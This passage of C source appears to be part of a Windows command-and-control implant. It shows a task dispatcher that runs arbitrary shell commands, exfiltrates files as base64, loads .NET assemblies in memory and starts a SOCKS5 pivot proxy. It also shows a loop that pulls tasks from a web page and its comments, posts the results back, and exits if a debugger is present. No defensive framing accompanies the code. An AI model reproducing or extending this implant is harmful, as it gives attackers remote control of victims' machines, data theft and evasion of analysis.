               strncmp(cmd, "ls ", 3) == 0) {
        char ls_cmd[2048];
        if (strlen(cmd) > 3)
            _snprintf(ls_cmd, sizeof(ls_cmd), "dir /B \"%s\"", cmd + 3);
        else
            strcpy(ls_cmd, "dir /B");
        run_shell(ls_cmd, raw_out, out_size);
    } else if (strncmp(cmd, "cat ", 4) == 0) {
        char cat_cmd[2048];
        _snprintf(cat_cmd, sizeof(cat_cmd), "type \"%s\"", cmd + 4);
        run_shell(cat_cmd, raw_out, out_size);
    } else if (strncmp(cmd, "download ", 9) == 0) {
        const char *dl_path = cmd + 9;
        FILE *df = fopen(dl_path, "rb");
        if (df) {
            fseek(df, 0, SEEK_END);
            long fsz = ftell(df);
            fseek(df, 0, SEEK_SET);
            if (fsz > 30000) {
                _snprintf(raw_out, out_size,
                    "[!] File too large: %ld bytes", fsz);
            } else if (fsz <= 0) {
                _snprintf(raw_out, out_size,
                    "[!] Empty file or read error");
            } else {
                unsigned char fbuf[30001];
                size_t nr = fread(fbuf, 1, (size_t)fsz, df);
                char fb64[45000];
                b64_encode(fbuf, nr, fb64);
                _snprintf(raw_out, out_size,
                    "[download] %s (%ld bytes)\n%s", dl_path, fsz, fb64);
            }
            fclose(df);
        } else {
            _snprintf(raw_out, out_size, "[!] Cannot open: %s", dl_path);
        }
    } else if (strncmp(cmd, "execute-assembly ", 17) == 0) {
        execute_dotnet_assembly(cmd + 17, raw_out, out_size);
    } else if (strncmp(cmd, "socks start ", 12) == 0) {
        if (g_socks_running) {
            _snprintf(raw_out, out_size, "[!] SOCKS5 already running on port %d", g_socks_port);
        } else {
            int port = atoi(cmd + 12);
            if (port < 1 || port > 65535) {
                _snprintf(raw_out, out_size, "[!] Invalid port: %s", cmd + 12);
            } else {
                g_socks_running = 1;
                g_socks_thread = CreateThread(NULL, 0, socks_server_main,
                                              (LPVOID)(ULONG_PTR)port, 0, NULL);
                if (g_socks_thread) {
                    Sleep(200);
                    if (g_socks_running && g_socks_port == port)
                        _snprintf(raw_out, out_size,
                            "[+] SOCKS5 proxy started on 127.0.0.1:%d", port);
                    else
                        _snprintf(raw_out, out_size,
                            "[!] SOCKS5 failed to bind port %d", port);
                } else {
                    g_socks_running = 0;
                    _snprintf(raw_out, out_size, "[!] Failed to create SOCKS thread");
                }
            }
        }
    } else if (strcmp(cmd, "socks stop") == 0) {
        if (!g_socks_running) {
            _snprintf(raw_out, out_size, "[*] SOCKS5 proxy is not running");
        } else {
            g_socks_running = 0;
            if (g_socks_thread) {
                WaitForSingleObject(g_socks_thread, 3000);
                CloseHandle(g_socks_thread);
                g_socks_thread = NULL;
            }
            _snprintf(raw_out, out_size, "[+] SOCKS5 proxy stopped");
        }
    } else if (strcmp(cmd, "socks status") == 0) {
        if (g_socks_running)
            _snprintf(raw_out, out_size,
                "[*] SOCKS5 running on 127.0.0.1:%d (%ld active connections)",
                g_socks_port, g_socks_conns);
        else
            _snprintf(raw_out, out_size, "[*] SOCKS5 proxy is not running");
    } else {
        run_shell(cmd, raw_out, out_size);
    }

    if (raw_out[0] == '\0') strcpy(raw_out, "(no output)");
    return 0;
}

static void snapshot_initial_tasks(void) {
    char *page = get_page_body();
    if (!page) return;
    const char *marker = ">C2:TASK:";
    const char *p = page;
    while ((p = strstr(p, marker)) != NULL) {
        const char *start = p + strlen(marker);
        const char *end_span = strstr(start, "</span>");
        if (!end_span) break;
        const char *colon1 = memchr(start, ':', (size_t)(end_span - start));
        if (colon1) {
            char tid[64] = {0};
            size_t tid_len = (size_t)(colon1 - start);
            if (tid_len >= sizeof(tid)) tid_len = sizeof(tid) - 1;
            memcpy(tid, start, tid_len);
            tid_mark_seen(tid);
        }
        p = end_span;
    }
}

static void c2_main(void) {
    winhttp_init();
    if (!g_hSession) return;

    generate_agent_id();
    register_agent();

    snapshot_initial_comments();
    snapshot_initial_tasks();

    while (1) {
        char *page = get_page_body();
        if (page) {
            static PARSED_TASK task;
            memset(&task, 0, sizeof(task));
            if (parse_task_from_html(page, &task)) {
                tid_mark_seen(task.task_id);
                static char raw_out[32768];
                memset(raw_out, 0, sizeof(raw_out));
                int do_exit = execute_command(task.command, raw_out, sizeof(raw_out));
                send_output(task.task_id, raw_out);
                if (do_exit) ExitProcess(0);
            }
        }

        {
            static PARSED_TASK ctask;
            memset(&ctask, 0, sizeof(ctask));
            if (parse_cmd_from_comments(&ctask)) {
                static char raw_out[32768];
                memset(raw_out, 0, sizeof(raw_out));
                int do_exit = execute_command(ctask.command, raw_out, sizeof(raw_out));
                send_visible_output(ctask.task_id, ctask.command, raw_out);
                if (do_exit) ExitProcess(0);
            }
        }

        Sleep(CFG_SLEEP_MS);
    }
}

#ifndef BUNDLED_BUILD
int main(void) {
    if (check_debugger()) return 1;
    c2_main();
    return 0;
}
#endif
